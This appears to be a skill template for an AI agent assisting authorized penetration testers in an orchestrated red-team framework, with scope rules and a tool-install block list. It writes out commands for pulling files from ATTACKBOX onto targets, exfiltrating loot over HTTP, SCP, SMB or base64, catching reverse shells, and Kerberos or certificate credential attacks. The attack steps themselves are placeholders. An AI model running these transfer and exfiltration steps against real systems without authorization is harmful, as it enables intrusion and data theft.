---
name: <skill-name>
description: >
  <What this skill does in 2-3 sentences. Focus on technique scope and when
  to use it. No trigger phrases, negative conditions, or OPSEC details here.>
keywords:
  - <operator search term>
  - <technique name or acronym>
  - <tool name that implies this technique>
tools:
  - <tool1>
  - <tool2>
opsec: <low|medium|high>
---

# <Skill Display Name>

You are helping a penetration tester with <technique description>. All testing
is under explicit written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[<skill-name>] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## Scope Boundary

This skill covers <scope>. When you reach the boundary of this scope — whether
through completing your methodology or discovering findings outside your
domain — **STOP**.

Do not load or execute another skill. Do not continue past your scope boundary.
Instead, return to the orchestrator with:
  - What was found (vulns, credentials, access gained)
  - Context to pass (injection point, target, working payloads, etc.)

The orchestrator decides what runs next. Your job is to execute this skill
thoroughly and return clean findings.

**Stay in methodology.** Only use techniques documented in this skill. If you
encounter a scenario not covered here, note it and return — do not improvise
attacks, write custom exploit code, or apply techniques from other domains.
The orchestrator will provide specific guidance or route to a different skill.

**Bail out on unmet preconditions.** If the Prerequisites for this skill are
not met (e.g., the injection point doesn't exist, the service isn't running,
user input never reaches the target function), report a negative finding and
return immediately. Do not pivot to unrelated attack vectors — the
orchestrator will route to the correct skill based on your report.

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Tool Requirements (Local-Only)

**NEVER download, clone, install, or build tools.** The operator's attackbox
has a curated toolset — do not modify it. This is an OPSEC requirement:
downloading tools mid-engagement triggers traffic inspection alerts and burns
the operation.

Prohibited actions:
- `git clone` — any repository, any source
- `pip install` / `pipx install` / `pip3 install` — any package
- `npm install` / `go install` / `cargo install` — any package
- `wget` / `curl -o` / `curl -O` — downloading files from the internet
- `apt install` / `apt-get install` — system packages
- Building tools from source that aren't already on the attackbox

If a tool required by this skill is not installed:
1. **STOP immediately** — do not attempt workarounds or alternative tools
2. Return to the orchestrator with:
   - Which tool is missing
   - What it's needed for
   - The command that would install it (so the operator can review and run it)
3. The orchestrator presents this to the operator as a hard stop

**Check if a tool exists before reporting it missing:**

    which <tool> 2>/dev/null || find /opt /usr/share /usr/local ~/.local/bin \
        -name '<tool>' -type f 2>/dev/null | head -3

Tools provided via MCP (nmap, shell-server commands) and tools inside the
red-run Docker containers (evil-winrm, impacket, Responder, etc.) are always
available — do not check for these.

## Exploit and Tool Transfer

Never download exploits, scripts, or tools directly to the target from the
internet (`curl https://github.com/...`, `git clone` on target). Targets may
lack outbound internet access, and operators must review files before they
reach the target.

**Attackbox-first workflow:**

1. **Check locally first** — see Tool Discovery above
2. **Download on attackbox** (only if not found) — `git clone`, `curl`, `searchsploit -m` locally
3. **Review** — inspect source code or binary provenance before transferring
4. **Serve** — `python3 -m http.server 8080` from the directory containing the file
5. **Pull from target** — `wget http://ATTACKBOX:8080/file -O /tmp/file` or
   `curl http://ATTACKBOX:8080/file -o /tmp/file`

**Alternatives when HTTP is not viable:** `scp`/`sftp` (if SSH exists),
`nc` file transfer, base64-encode and paste, or
`impacket-smbserver share . -smb2support` on attackbox.

**Inline source code** written via heredoc in this skill does not need this
workflow — the operator can read the code directly.

## Web Interaction

When interacting with web applications, use the browser MCP tools as the
default for navigating sites, filling forms, and managing sessions. Browser
tools handle CSRF tokens, session cookies, JavaScript-rendered content, and
multi-step flows that curl cannot.

- **Browser tools** (default) — navigate pages, fill forms, manage sessions,
  take screenshots for evidence, execute JavaScript for DOM inspection
- **curl** (fallback) — crafted payloads needing precise header/body control,
  injection testing where exact request structure matters
- **Injection-focused skills** may use curl directly for payload delivery when
  the browser adds unwanted encoding or headers

## File Exfiltration

When retrieving files from a compromised target (loot, backups, configs,
databases), prefer direct download over encoding. Choose the first method
that works:

1. **Web-accessible** (file in webroot, served by HTTP/HTTPS)?
   → `curl`/`wget` from attackbox. Fastest and cleanest.
2. **SSH/SCP access available?**
   → `scp user@target:/path/file ./engagement/evidence/`
3. **Target can reach attackbox** (outbound HTTP)?
   → Target: `python3 -m http.server 8080` from the file's directory
   → Attackbox: `curl http://TARGET:8080/file -o evidence/file`
4. **SMB available?**
   → Attackbox: `impacket-smbserver share ./evidence -smb2support`
   → Target: `copy file \\ATTACKBOX\share\file`
5. **Last resort** (air-gapped, no outbound, no writable shares):
   → `base64 file | tr -d '\n'` on target, paste on attackbox, decode
   → Only for small files (<50KB)

**Never default to base64 when a download method exists.** Base64 is slow,
error-prone on large files, and produces unreadable blobs in shell transcripts.

## Shell Access

Use the shell-server MCP tools documented in your agent template to catch and
stabilize reverse shells. Prefer reverse shells over inline command execution.

## Prerequisites

- <Required access level or position>
- <Required tools (with install note)>
- <Conditions that must be true>

### Special characters in credentials

Bash history expansion treats `!` as a special character (`!event`), even
inside double quotes. Passwords containing `!`, `$`, backticks, or other
shell metacharacters will be silently mangled when passed as command arguments.

**Canonical workaround** — write to file, read from file:

```bash
# 1. Use the Write tool (not echo/printf) to create a password file
#    The Write tool bypasses shell interpretation entirely
Write("/tmp/claude-1000/cred.txt", "lDaP_1n_th3_cle4r!")

# 2. Read into a variable
PASS=$(cat /tmp/claude-1000/cred.txt)

# 3. Use the variable in commands (double-quote it)
certipy req -username user@domain -password "$PASS" -dc-ip 10.10.10.5
```

Do NOT attempt to escape `!` with `\!`, single quotes, `set +H`, or `printf`.
These are unreliable in the Claude Code Bash tool context. The Write-to-file
pattern is the only reliable approach.

### Impacket binary naming

Impacket tools have inconsistent binary names across installations. Some
systems use `getTGT.py`, `addcomputer.py`, `secretsdump.py`; others use
`impacket-getTGT`, `impacket-addcomputer`, `impacket-secretsdump` (pip/pipx
installed). Before using an Impacket tool, find the correct binary:

```bash
# Example: find addcomputer
which addcomputer.py 2>/dev/null || which impacket-addcomputer 2>/dev/null
```

Use whichever binary exists. If neither is found, check `/usr/share/doc/python3-impacket/examples/` (Debian) or `~/.local/bin/` (pipx).

### Tool output directory

Several tools write output files to CWD with no output-path flag
(`getTGT.py` → `<user>.ccache`, `certipy req` → `<user>.pfx`,
`certipy auth` → `<user>.ccache`, `bloodyAD add shadowCredentials` →
`<user>_*.pfx`). To avoid scattering files in the working directory:

```bash
# Always prefix CWD-writing commands with cd $TMPDIR
cd $TMPDIR && getTGT.py DOMAIN/user -hashes :NTHASH
export KRB5CCNAME=$TMPDIR/user.ccache

cd $TMPDIR && certipy req -k -no-pass -dc-ip DC_IP -ca 'CA' -template Tpl
cd $TMPDIR && certipy auth -pfx $TMPDIR/user.pfx -dc-ip DC_IP

# Save evidence with mv (not cp) to avoid stray duplicates
mv $TMPDIR/user.pfx engagement/evidence/user.pfx
mv $TMPDIR/user.ccache engagement/evidence/user.ccache
```

**Note**: `getTGT.py` does NOT support `-out`. It always writes
`<user>.ccache` to CWD. The `cd $TMPDIR &&` prefix is the only control.

## Step 1: Assess

If not already provided by the orchestrator or conversation context, determine:
1. <Key info needed>
2. <Key info needed>
3. <Key info needed>

Skip if context was already provided.

## Step 2: Confirm Vulnerability

<How to verify the technique applies. Embedded test payloads.>

## Step 3: Exploit

### Variant A: <Description>

```bash
# Explanation of what this does
command arg1 arg2
```

### Variant B: <Description>

```bash
# Alternative when Variant A fails or is blocked
command arg1 arg2
```

## Step N: Post-Exploitation Exit

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

<!-- Stall Detection lives in agent templates — do not add here -->

<!-- AV/EDR Detection lives in agent templates — do not add here -->

<!-- DNS Resolution Failure lives in agent templates — do not add here -->

## Troubleshooting

### <Common Problem>
<Solution>
